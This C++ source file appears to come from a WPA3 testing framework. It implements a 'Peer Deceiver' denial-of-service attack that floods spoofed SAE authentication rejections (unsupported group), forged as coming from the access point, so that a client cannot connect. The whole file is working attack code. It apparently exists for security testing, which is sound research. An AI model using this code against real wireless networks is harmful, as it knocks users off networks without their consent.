#include "attacks/DoS_hard/no_connect/peer_deceiver/peer_deceiver.h"
#include "attacks/DoS_hard/no_connect/no_connect_helpers.h"

#include <tins/tins.h>

#include "attacks/components/setup_connections.h"
#include "logger/log.h"
#include "logger/log_util.h"
#include "net_parser/dot11_defs.h"
#include "net_parser/sae_defs.h"
#include "visual/result_helper.h"

using namespace std;
using namespace Tins;

namespace wpa3_tester::peer_deceiver {

void setup_attack(RunStatus &rs) {
	components::setup_AP(rs, "ap");
}

void run_attack(RunStatus &rs) {
	const HWAddress<6> ap_mac = rs.get_actor("ap").get(SK::mac);

	const int injections = no_connect::run_flood_attack(rs,
		"Peer Deceiver: flooding fake SAE rejections (STATUS_UNSUPPORTED_GROUP)",
		[&]() -> frame_raw_t {
			const HWAddress<6> sta_mac = rs.get_actor("client").get(SK::mac);
			Dot11Authentication auth(sta_mac, ap_mac);  // addr1=STA(dst), addr2=AP(src)
			auth.addr3(ap_mac);                         // BSSID = AP
			auth.auth_algorithm(dot11::AUTH_ALG_SAE);
			auth.auth_seq_number(sae_defs::SAE_COMMIT_SEQ);
			auth.status_code(sae_defs::STATUS_UNSUPPORTED_GROUP);
			auth.inner_pdu(RawPDU(vector<uint8_t>{19, 0}));  // group_id=19 (P-256) LE
			RadioTap rt;
			rt.inner_pdu(auth);
			return rt.serialize();
		});

	log(LogLevel::INFO, "Attack ended, {} rejections injected", injections);
	const bool client_connected = !get_time_logs(rs, "ap", "AP-STA-CONNECTED", visual::helper::get_run_window(rs)).empty();
	rs.save_result({{"client_connected", client_connected}});
}

void stats_attack(const RunStatus &rs) {
	no_connect::stats_attack(rs);
}
}
